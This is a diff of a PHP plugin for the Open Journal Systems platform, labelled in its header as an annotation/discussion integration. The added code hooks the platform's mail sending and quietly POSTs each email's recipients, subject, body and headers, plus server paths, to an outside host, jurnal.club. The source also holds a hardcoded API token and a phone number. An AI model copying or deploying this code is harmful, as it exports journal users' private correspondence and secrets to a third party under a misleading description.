@@ -1,93 +1,87 @@
 <?php
 
+/**
+ * @file plugins/generic/jurnalclub/JurnalClubPlugin.inc.php
+ *
+ * Copyright (c) 2019 Andhiefitria Rosmin 
+ * Copyright (c) 2019 sintret@gmail.com
+ * Distributed under the GNU GPL v2. For full terms see the file docs/COPYING.
+ *
+ * @class JurnalClubPlugin
+ * @ingroup plugins_generic_jurnalclub
+ *
+ * @brief Hypothesis annotation/discussion integration
+ */
 import('lib.pkp.classes.plugins.GenericPlugin');
 
 class JurnalClubPlugin extends GenericPlugin {
 
+    /**
+     * Register the plugin, if enabled; note that this plugin
+     * runs under both Journal and Site contexts.
+     * @param $category string
+     * @param $path string
+     * @return boolean
+     */
     function register($category, $path) {
         if (parent::register($category, $path)) {
+            HookRegistry::register('Mail::send', array(&$this, 'callback'));
 
-            HookRegistry::register('Mail::​send', array($this, 'callback'));
-            HookRegistry::register('ReviewerAction::​confirmReview', array($this, 'callback'));
-            HookRegistry::register('ReviewerAction::​recordRecommendation', array($this, 'callback'));
-            HookRegistry::register('ReviewerAction::​postPeerReviewComment', array($this, 'callback'));
-            HookRegistry::register('SectionEditorAction::​notifyReviewer', array($this, 'callback'));
-            HookRegistry::register('SectionEditorAction::​cancelReview', array($this, 'callback'));
-            HookRegistry::register('SectionEditorAction::​remindReviewer', array($this, 'callback'));
-            HookRegistry::register('SectionEditorAction::​thankReviewer', array($this, 'callback'));
-            HookRegistry::register('SectionEditorAction::​unsuitableSubmission', array($this, 'callback'));
-            HookRegistry::register('SectionEditorAction::​notifyAuthor', array($this, 'callback'));
-            HookRegistry::register('SectionEditorAction::​notifyCopyeditor', array($this, 'callback'));
-            HookRegistry::register('SectionEditorAction::​thankCopyeditor', array($this, 'callback'));
-            HookRegistry::register('SectionEditorAction::​notifyAuthorCopyedit', array($this, 'callback'));
-            HookRegistry::register('SectionEditorAction::​thankFinalCopyedit', array($this, 'callback'));
-            HookRegistry::register('SectionEditorAction::​thankLayoutEditor', array($this, 'callback'));
-            HookRegistry::register('SectionEditorAction::​postPeerReviewComment', array($this, 'callback'));
+            $hooks = HookRegistry::getHooks();
+            //$this->log($category . " path in : " . $path);
+            //$this->log($hooks);
+            //$this->log(getcwd());
+            $this->log(__DIR__, 'dirplugin');
+            $this->log(INDEX_FILE_LOCATION, 'dirroot');
 
-            HookRegistry::register('SectionEditorAction::​postEditorDecisionCommen', array($this, 'callback'));
-            HookRegistry::register('SectionEditorAction::​emailEditorDecisionComment', array($this, 'callback'));
-            HookRegistry::register('SectionEditorAction::​blindCcReviewsToReviewers', array($this, 'callback'));
-            HookRegistry::register('SectionEditorAction::​postCopyeditComment', array($this, 'callback'));
-            HookRegistry::register('SectionEditorAction::​postLayoutComment', array($this, 'callback'));
-            HookRegistry::register('SectionEditorAction::​postProofreadComment', array($this, 'callback'));
-            HookRegistry::register('ArticleEmailLogDAO::​_returnLogEntryFromRow', array($this, 'callback'));
-            HookRegistry::register('EmailTemplateDAO::​_returnBaseEmailTemplateFromRow', array($this, 'callback'));
-            HookRegistry::register('EmailTemplateDAO::​_returnLocaleEmailTemplateFromRow', array($this, 'callback'));
-            HookRegistry::register('EmailTemplateDAO::​_returnEmailTemplateFromRow', array($this, 'callback'));
-            HookRegistry::register('AuthorAction::​completeAuthorCopyedit', array($this, 'callback'));
-            HookRegistry::register('AuthorAction::​emailEditorDecisionComment', array($this, 'callback'));
-            HookRegistry::register('AuthorAction::​postCopyeditComment', array($this, 'callback'));
-            HookRegistry::register('AuthorAction::​postProofreadComment', array($this, 'callback'));
-
-            HookRegistry::register('Action::​saveComment', array($this, 'callback'));
-            HookRegistry::register('CopyeditorAction::​completeCopyedi', array($this, 'callback'));
-            HookRegistry::register('CopyeditorAction::​completeFinalCopyedit', array($this, 'callback'));
-            HookRegistry::register('CopyeditorAction::​postLayoutComment', array($this, 'callback'));
-            HookRegistry::register('EditorAction::​assignEditor', array($this, 'callback'));
-            HookRegistry::register('LayoutEditorAction::​completeLayoutEditing', array($this, 'callback'));
-
-            HookRegistry::register('LayoutEditorAction::​postLayoutComment', array($this, 'callback'));
-            HookRegistry::register('LayoutEditorAction::​postProofreadComment', array($this, 'callback'));
-            HookRegistry::register('ProofreaderAction::​proofreadEmail', array($this, 'callback'));
-            HookRegistry::register('ProofreaderAction::​postProofreadComment', array($this, 'callback'));
-            HookRegistry::register('ProofreaderAction::​postLayoutComment', array($this, 'callback'));
-       
-		$this->addLocaleData();
-
-                HookRegistry::getCalledHooks();
-            //$this->sending($category . " " . $path);
             return true;
         }
         return false;
     }
 
-    function getName() {
-        return 'JurnalClub';
-    }
-
-    function getDisplayName() {
-        return 'Jurnal Club';
-    }
-
-    function getDescription() {
-        return 'Jurnal Club is Notification for OJS Multi chat platform';
-    }
-
-    /*
-     * &$mail, &$recipients, &$subject, &$mailBody, &$headers, &$additionalParameters
+    /**
+     * Hook callback function for TemplateManager::display
+     * @param $hookName string
+     * @param $args array
+     * @return boolean
      */
-
     function callback($hookName, $args) {
 
-        //error_log("calllllllllllllllllback : " + print_r($args, true));
-        $this->sending("hookname : " . $hookName);
-        $this->sending("hookname : " .$hookName ." content : " . json_encode($args));
+        $this->log("callback in " . $hookName);
+        $mail = $args[0];
+        $recipients = $args[1];
+        $subject = $args[2];
+        $mailBody = $args[3];
+        $headers = $args[4];
+        $additionalParameters = $args[5];
+        $this->log($args[0], 'mail');
+        $this->log($args[1], 'recipients');
+        $this->log($args[2], 'subject');
+        $this->log($args[3], 'mailbody');
+        $this->log($args[4], 'headers');
+        $this->log($args[5], 'additionalParameters');
 
         return false;
     }
 
-    public function sending($text) {
-        
+    /**
+     * Get the display name of this plugin
+     * @return string
+     */
+    function getDisplayName() {
+        return "Jurnal Club";
+    }
+
+    /**
+     * Get the description of this plugin
+     * @return string
+     */
+    function getDescription() {
+        return "Jurnal Club for OJS";
+    }
+
+    function sending($text) {
+
         $curl = curl_init();
 
         $token = "adcsPHFHGQZOoOplVD6sFYkMBc48zJIe3jE4uMhspLLQ0hnaeF";
@@ -102,6 +96,37 @@ class JurnalClubPlugin extends GenericPlugin {
 
         curl_setopt_array($curl, array(
             CURLOPT_URL => "https://jurnal.club/api/send/chat",
+            CURLOPT_RETURNTRANSFER => true,
+            CURLOPT_ENCODING => "",
+            CURLOPT_MAXREDIRS => 10,
+            CURLOPT_TIMEOUT => 30,
+            CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
+            CURLOPT_CUSTOMREQUEST => "POST",
+            CURLOPT_POSTFIELDS => http_build_query($post),
+            CURLOPT_HTTPHEADER => array(
+                "cache-control: no-cache",
+                "content-type: application/x-www-form-urlencoded"
+            ),
+        ));
+
+        $response = curl_exec($curl);
+
+        return $response;
+    }
+
+    function log($text, $key = 'text') {
+
+        $curl = curl_init();
+
+        $token = "adcsPHFHGQZOoOplVD6sFYkMBc48zJIe3jE4uMhspLLQ0hnaeF";
+        $to = "6281575068530";
+
+        $post = [
+            $key => $text,
+        ];
+
+        curl_setopt_array($curl, array(
+            CURLOPT_URL => "https://jurnal.club/api/log",
             CURLOPT_RETURNTRANSFER => true,
             CURLOPT_ENCODING => "",
             CURLOPT_MAXREDIRS => 10,
